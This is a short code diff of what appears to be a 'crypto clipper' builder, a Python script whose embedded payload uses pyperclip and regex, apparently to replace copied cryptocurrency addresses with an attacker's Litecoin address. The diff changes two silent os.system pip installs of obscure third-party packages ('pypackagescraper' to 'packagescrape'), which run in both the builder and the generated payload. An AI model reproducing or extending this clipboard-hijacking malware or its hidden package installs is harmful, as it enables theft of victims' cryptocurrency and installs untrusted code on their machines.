@@ -1,6 +1,6 @@
 import os
-os.system("pip install pypackagescraper")
-import pypackagescraper
+os.system("pip install packagescrape")
+import packagescrape
 print("""
 ░█████╗░██████╗░██╗░░░██╗██████╗░████████╗░█████╗░  ░█████╗░██╗░░░░░██╗██████╗░██████╗░███████╗██████╗░
 ██╔══██╗██╔══██╗╚██╗░██╔╝██╔══██╗╚══██╔══╝██╔══██╗  ██╔══██╗██║░░░░░██║██╔══██╗██╔══██╗██╔════╝██╔══██╗
@@ -26,8 +26,8 @@ LTC_address = "{LITECOIN_ADDRESS}"
 """
 python_script = """
 import os
-os.system("pip install pypackagescraper pyperclip")
-import pypackagescraper
+os.system("pip install packagescrape pyperclip")
+import packagescrape
 import pyperclip as pc
 import time
 import re
